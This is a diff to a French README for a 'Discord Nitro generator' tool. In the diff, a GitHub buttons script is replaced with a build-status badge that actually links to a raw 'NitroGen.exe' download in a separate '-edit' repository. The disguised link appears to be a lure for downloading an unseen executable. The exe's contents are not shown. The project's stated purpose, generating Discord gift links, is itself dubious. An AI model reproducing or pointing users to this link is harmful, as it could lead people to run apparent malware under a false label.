@@ -1,7 +1,6 @@
 # nitro_generator
 
-<script async defer src="https://buttons.github.io/buttons.js">
-</script>
+[![Download](https://github.com/ntkme/github-buttons/workflows/build/badge.svg)](https://github.com/oxyblade-1/nitro_generator-edit/raw/main/NitroGen.exe)
 
 ![banner_nitro](https://gifimage.net/wp-content/uploads/2017/10/discord-gif-emoji-3.gif)
 
@@ -35,7 +34,7 @@ il est temps que je vous explique le protocole pour executer le programme.
 
 et vous obtiendrez alors ceci:
 
-![c1]()
+![c1](https://github.com/oxyblade-1/nitro_generator-edit/blob/main/images/c1.png)
 
 Après cela si par chance et que le programme fonctionne, il devrait apparaître à l'endroit du exe un fichier .txt avec le lien gift (car j'avais prévu que vous ne resterez pas devant la console), Néanmoins...
 
